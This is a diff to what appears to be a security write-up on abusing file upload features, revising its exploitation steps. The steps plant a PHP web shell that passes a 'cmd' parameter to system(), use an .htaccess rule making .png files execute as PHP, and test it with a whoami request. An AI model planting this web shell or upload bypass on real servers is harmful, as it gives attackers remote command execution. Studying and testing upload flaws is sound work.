@@ -47,14 +47,24 @@ File upload functionality is often a critical entry point for attackers. In this
 
 ## Exploitation Steps
 
-1. Upload a **malicious PHP file** disguised as an image  
-2. Upload an **`.htaccess` file** to bypass content-type restrictions  
-3. Access the uploaded PHP file via the browser  
-4. Achieve **remote code execution**  
+1. Prepare the exploit files:  
+   - `exploit.php` — the malicious PHP web shell  
+   - `blank.png` — a harmless-looking image file to bypass file type restrictions  
+2. Upload `blank.png` to test the upload functionality  
+3. Upload `exploit.php` disguised as an allowed file  
+4. Upload an `.htaccess` file to enforce PHP execution on disguised uploads:  
+
+```apache
+AddType application/x-httpd-php .png
+````
+
+5. Access the uploaded `exploit.php` via the browser to execute commands
 
 ---
 
 ## Proof of Concept
+
+**exploit.php**:
 
 ```php
 <?php
@@ -63,19 +73,12 @@ if(isset($_GET['cmd'])){
     system($_GET['cmd']);
 }
 ?>
-````
-
-* Upload the above PHP shell as `shell.php`
-* Upload an `.htaccess` with content:
-
-```apache
-AddType application/x-httpd-php .jpg
 ```
 
-* Access `shell.php` via browser and test commands:
+Test the exploit:
 
 ```
-http://target.com/uploads/shell.php?cmd=whoami
+http://target.com/uploads/exploit.php?cmd=whoami
 ```
 
 ---
